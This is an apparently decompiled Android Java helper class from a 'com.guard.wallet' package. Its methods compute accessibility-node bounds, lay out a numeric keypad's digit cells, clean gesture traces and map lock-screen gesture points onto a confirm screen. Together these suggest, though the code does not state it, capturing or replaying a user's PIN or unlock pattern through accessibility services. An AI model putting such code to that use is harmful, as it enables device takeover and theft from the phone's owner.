package com.guard.wallet.helper;

import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import com.guard.wallet.entity.Point;
import com.guard.wallet.req.ScreenMetricsVO;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;

/**
 * 节点坐标/边界计算辅助类。
 *
 * <p>提供 AccessibilityNodeInfo 边界获取、数字键盘九宫格映射、
 * 手势轨迹去重与锁屏→确认屏坐标映射等静态工具方法。</p>
 *
 * <p>vendor 原始类: {@code com.guard.wallet.helper.a}</p>
 */
public abstract class NodeBoundsHelper {

    public static Rect a(AccessibilityNodeInfo node) {
        Rect rect = new Rect();
        if (Build.VERSION.SDK_INT >= 34) {
            node.getBoundsInWindow(rect);
        } else {
            node.getBoundsInScreen(rect);
        }
        c(rect);
        return rect;
    }

    public static HashMap<Integer, Rect> b(Rect bounds) {
        HashMap<Integer, Rect> map = new HashMap<>();
        float cellW = (float) bounds.width() / 3.0f;
        float cellH = (float) bounds.height() / 4.0f;

        for (int i = 0; i <= 9; i++) {
            Rect cell;
            if (i == 0) {
                float x = bounds.left + cellW;
                float y = cellH * 3.0f + bounds.top;
                cell = new Rect((int) x, (int) y, (int) (x + cellW), (int) (y + cellH));
            } else {
                int idx = i - 1;
                int row = idx / 3;
                int col = idx % 3;
                float x = bounds.left + col * cellW;
                float y = bounds.top + row * cellH;
                cell = new Rect((int) x, (int) y, (int) (x + cellW), (int) (y + cellH));
            }
            map.put(i, cell);
        }
        return map;
    }

    public static void c(Rect rect) {
        ScreenMetricsVO metrics = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics();
        if (metrics.getWidth() > 0 && rect.left > 0 && rect.left >= metrics.getWidth()) {
            rect.left -= metrics.getWidth();
            rect.right -= metrics.getWidth();
        }
    }

    public static void d(LinkedList<Point> points) {
        if (points.isEmpty()) return;
        ListIterator<Point> it = points.listIterator();
        Point prev = null;
        while (it.hasNext()) {
            Point p = it.next();
            if (p == null || p.getX() < 0.0f || p.getY() < 0.0f) {
                it.remove();
            } else if (p.equals(prev)) {
                it.remove();
            } else {
                prev = p;
            }
        }
    }

    public static List<Point> e(LinkedList<Point> points, Rect lockBounds, Rect lockArea,
                                 Rect confirmBounds, Rect confirmArea) {
        if (lockArea == null || lockBounds == null || confirmBounds == null || confirmArea == null) return points;
        if (points.isEmpty()) return points;

        LinkedList<Point> result = new LinkedList<>();
        ScreenMetricsVO metrics = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics();

        int lockW = lockBounds.width();
        int lockH = lockBounds.height();
        int lockSize = Math.min(lockH, lockW);
        int lockExtraH = Math.max(0, lockArea.height() - lockH);

        int lockCenterX = metrics.getWidth() > 0 ? metrics.getWidth() / 2 : lockW / 2 + lockBounds.left;
        int lockCenterY = lockH / 2 + lockBounds.top + lockExtraH / 2;

        int confW = confirmArea.width();
        int confH = confirmArea.height();
        int confSize = Math.min(confH, confW);
        int confExtraH = Math.max(0, confirmBounds.height() - confH);

        int confCenterX = metrics.getWidth() > 0 ? metrics.getWidth() / 2 : confW / 2 + confirmArea.left;
        int confCenterY = confH / 2 + confirmArea.top + confExtraH / 2;

        float scale = (float) confSize / (float) lockSize;

        for (Point p : points) {
            Point mapped = new Point();
            mapped.setX((p.getX() - lockCenterX) * scale + confCenterX);
            mapped.setY((p.getY() - lockCenterY) * scale + confCenterY);
            result.add(mapped);
        }
        return result;
    }
}
